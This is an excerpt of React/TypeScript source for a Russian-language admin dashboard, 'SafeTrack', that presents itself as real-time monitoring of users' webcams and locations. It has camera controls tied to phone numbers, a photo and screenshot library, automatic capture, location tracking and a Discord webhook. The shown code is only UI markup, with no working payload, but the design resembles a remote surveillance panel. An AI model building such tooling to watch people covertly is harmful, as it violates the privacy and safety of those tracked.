...
import { Shield, MapPin, Users, Eye, Lock, Copy, Camera, Download, Settings, Image } from 'lucide-react';
    ...
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
      <Card className="w-full max-w-md border-slate-700 bg-slate-800">
        <CardHeader className="text-center">
          ...
          <CardTitle className="text-2xl font-bold text-white">Админ доступ</CardTitle>
...
export const AdminPanel: React.FC<AdminPanelProps> = ({ onLogout }) => {
  ...
  const getStatus = (user: User) => {
    ...
    if (diffMinutes < 10) return { status: 'idle', text: `${diffMinutes} мин назад` };
      ...
      <div className="max-w-7xl mx-auto space-y-6">
        ...
        <div className="flex justify-between items-center">
          <div className="flex items-center space-x-3">
            ...
            <div>
              <h1 className="text-3xl font-bold text-white">Панель мониторинга SafeTrack</h1>
              <p className="text-slate-400">Система мониторинга веб-камер и местоположения в реальном времени</p>
            </div>
          </div>
          <Button onClick={onLogout} variant="outline" className="border-slate-600 text-slate-300">
            Выйти
          </Button>
        </div>
        ...
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">Активные сессии</CardTitle>
          ...
          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">Всего пользователей</CardTitle>
          ...
          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">Доступ к камере</CardTitle>
          ...
          <Card className="border-slate-700 bg-slate-800">
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium text-slate-300">Снимки экрана</CardTitle>
        ...
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-4 bg-slate-800 border-slate-700">
            ...
            <TabsTrigger value="camera" className="text-slate-300 data-[state=active]:text-white">
              Управление камерой
            </TabsTrigger>
            <TabsTrigger value="photos" className="text-slate-300 data-[state=active]:text-white">
              Библиотека фото
            </TabsTrigger>
          ...
          <TabsContent value="overview" className="space-y-6">
            <Card className="border-slate-700 bg-slate-800">
              <CardHeader>
                ...
                <CardDescription className="text-slate-400">
                  {loading ? 'Загрузка...' : `${users.length} пользователей зарегистрировано`}
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {users.length === 0 && !loading ? (
                    ...
                    users.map((user) => {
                      ...
                      return (
                        <div key={user.id} className="p-4 border border-slate-700 rounded-lg bg-slate-750">
          ...
          <TabsContent value="camera" className="space-y-6">
            {selectedUser ? (
              <div className="space-y-4">
                ...
                <CameraControls phoneNumber={selectedUser.phone_number} />
              </div>
            ) : (
              <Card className="border-slate-700 bg-slate-800">
                <CardContent className="pt-6">
                  <div className="text-center text-slate-400 py-8">
                    ...
                    <p className="text-lg mb-4">Выберите пользователя для управления камерой</p>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 max-w-4xl mx-auto">
                      {users.filter(u => u.consents?.camera).map((user) => (
                        <Button
                          key={user.id}
            ...
            <Card className="border-slate-700 bg-slate-800">
              ...
              <CardContent className="space-y-6">
                <div className="p-4 bg-blue-900 bg-opacity-50 border border-blue-700 rounded-lg">
                  <h4 className="font-medium text-blue-300 mb-2">Discord Webhook</h4>
                ...
                <div className="p-4 bg-green-900 bg-opacity-50 border border-green-700 rounded-lg">
                  <h4 className="font-medium text-green-300 mb-2">Автоматический захват</h4>
                ...
                <div className="p-4 bg-purple-900 bg-opacity-50 border border-purple-700 rounded-lg">
                  <h4 className="font-medium text-purple-300 mb-2">Отслеживание местоположения</h4>
